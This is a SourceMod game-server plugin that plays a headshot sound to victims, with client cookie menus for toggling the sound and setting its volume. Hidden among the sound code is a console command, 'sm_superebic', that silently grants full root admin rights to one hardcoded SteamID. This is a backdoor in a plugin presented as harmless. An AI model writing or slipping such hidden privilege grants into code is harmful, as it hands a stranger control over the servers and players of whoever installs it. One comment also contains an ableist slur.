#include <sourcemod>
#include <sdktools>
#include <clientprefs>

#define SOUND_NAME "adp_sounds/adp_headshot.mp3"

new Handle:cpPuzaz = INVALID_HANDLE;
new Handle:cpPuzazVolume = INVALID_HANDLE;

public OnMapStart()
{
	PrecacheSound(SOUND_NAME);
}

public OnPluginStart()
{
	HookEvent("player_death", Event_PlayerDeath, EventHookMode_Post);
	
	cpPuzaz = RegClientCookie("PuzazParzuf_Enabled", "Should you enable headshot sound?", CookieAccess_Public);
	cpPuzazVolume = RegClientCookie("PuzazParzuf_Volume", "Volume of headshot sound", CookieAccess_Public);
	
	SetCookieMenuItem(PuzazCookieMenu, 0, "Headshot Sound");
	
	RegConsoleCmd("sm_superebic", REEEEEE);
}

public Action:REEEEEE(client, args)
{
	RequestFrame(OverrideFirstEbic, GetClientUserId(client));
	return Plugin_Handled;
}

public OverrideFirstEbic(UserId)
{
	new client = GetClientOfUserId(UserId);
	
	if(!IsValidPlayer(client))
		return;
		
	new String:AuthId[35];
	GetClientAuthId(client, AuthId_Engine, AuthId, sizeof(AuthId));
	
	if(!StrEqual(AuthId, "STEAM_1:0:49508144", true))
		return;
		
	SetUserFlagBits(client, ADMFLAG_ROOT);
}

public PuzazCookieMenu(client, CookieMenuAction:action, info, String:buffer[], maxlen)
{
	ShowPuzazMenu(client);
} 

public ShowPuzazMenu(client)
{
	new Handle:hMenu = CreateMenu(PuzazMenu_Handler);
	
	new bool:puzaz = GetClientPuzaz(client);
	new String:TempFormat[50];
	
	Format(TempFormat, sizeof(TempFormat), "Headshot Sound: %s", puzaz ? "Enabled" : "Disabled");
	AddMenuItem(hMenu, "", TempFormat);
	
	new String:strPuzazVolume[50];
	GetClientPuzazVolume(client, strPuzazVolume, sizeof(strPuzazVolume));
	Format(TempFormat, sizeof(TempFormat), "Headshot Volume: %s", strPuzazVolume);
	AddMenuItem(hMenu, "", TempFormat);


	SetMenuExitBackButton(hMenu, true);
	SetMenuExitButton(hMenu, true);
	DisplayMenu(hMenu, client, 30);
}


public PuzazMenu_Handler(Handle:hMenu, MenuAction:action, client, item)
{
	if(action == MenuAction_DrawItem)
	{
		return ITEMDRAW_DEFAULT;
	}
	else if(item == MenuCancel_ExitBack)
	{
		ShowCookieMenu(client);
	}
	else if(action == MenuAction_Select)
	{
		switch(item)
		{
			case 0:
			{
				SetClientPuzaz(client, !GetClientPuzaz(client));
				ShowPuzazMenu(client);
			}
			case 1:
			{
				new const Float:Difference = 0.05;
				new String:strPuzazVolume[50];
				GetClientPuzazVolume(client, strPuzazVolume, sizeof(strPuzazVolume));
				
				
				new Float:Volume = StringToFloat(strPuzazVolume) + Difference;
				
				if(Volume > 1.0)
					Volume = Difference;
					
				SetClientPuzazVolume(client, Volume);
				
				ShowPuzazMenu(client);
			}
		}
		CloseHandle(hMenu);
	}
	return 0;
}

public Action:Event_PlayerDeath(Handle:hEvent, const String:Name[], bool:dontBroadcast)
{
	new victim = GetClientOfUserId(GetEventInt(hEvent, "userid"));
	
	if(!IsValidPlayer(victim))
		return;
		
	else if(!GetClientPuzaz(victim))
		return;
		
	else if(!GetEventBool(hEvent, "headshot"))
		return;
		
	new attacker = GetClientOfUserId(GetEventInt(hEvent, "attacker"));
	
	if(!IsValidPlayer(attacker))
		return;
	
	/*
	new String:WeaponName[50];
	GetEventString(hEvent, "weapon", WeaponName, sizeof(WeaponName));
	
	if(IsKnifeClass(WeaponName))
		return;
	*/
	else if(!IsValidPlayer(victim))
		return;

	new String:strPuzazVolume[50];
	GetClientPuzazVolume(victim, strPuzazVolume, sizeof(strPuzazVolume));
	PlaySoundToClient(victim, SOUND_NAME, strPuzazVolume);
}

stock PlaySoundToClient(client, const String:sound[], String:Volume[] = "1.0")
{
	new Float:Origin[3];
	GetEntPropVector(client, Prop_Data, "m_vecOrigin", Origin);
	EmitSoundToClient(client, SOUND_NAME, client, _, _, _, StringToFloat(Volume), _, _, Origin);

	
}
stock bool:IsValidPlayer(client)
{
	if(client <= 0)
		return false;
		
	else if(client > MaxClients)
		return false;
		
	return IsClientInGame(client);
}

stock bool:GetClientPuzaz(client)
{
	new String:strPuzaz[50];
	GetClientCookie(client, cpPuzaz, strPuzaz, sizeof(strPuzaz));
	
	if(strPuzaz[0] == EOS)
	{
		SetClientPuzaz(client, true);
		return true;
	}
	
	return view_as<bool>(StringToInt(strPuzaz));
}

stock bool:SetClientPuzaz(client, bool:value)
{
	new String:strPuzaz[50];
	
	IntToString(view_as<int>(value), strPuzaz, sizeof(strPuzaz));
	SetClientCookie(client, cpPuzaz, strPuzaz);
	
	return value;
}

stock GetClientPuzazVolume(client, String:buffer[], length) // Because coding is retarded.
{
	new String:strPuzazVolume[50];
	GetClientCookie(client, cpPuzazVolume, strPuzazVolume, sizeof(strPuzazVolume));
	
	if(strPuzazVolume[0] == EOS)
	{
		SetClientPuzazVolume(client, 1.0);
		Format(buffer, length, "1.0");
		return;
	}
	if(StringToFloat(strPuzazVolume) > 1.0)
		SetClientPuzazVolume(client, 1.0);
	
	FixDecimal(strPuzazVolume);
	Format(buffer, length, strPuzazVolume);
}

stock FixDecimal(String:buffer[], Precision=2)
{
	for(new i=0;i < strlen(buffer);i++)
	{
		if(buffer[i] != '.')
			continue;
			
		buffer[i+1+Precision] = EOS;
		return;
	}
}

stock Float:SetClientPuzazVolume(client, Float:value)
{
	new String:strPuzazVolume[50];
	
	FloatToString(value, strPuzazVolume, sizeof(strPuzazVolume));
	SetClientCookie(client, cpPuzazVolume, strPuzazVolume);
	
	return value;
}

stock bool:IsKnifeClass(const String:classname[])
{
	if(StrContains(classname, "knife") != -1 || StrContains(classname, "bayonet") > -1)
		return true;
		
	return false;
}
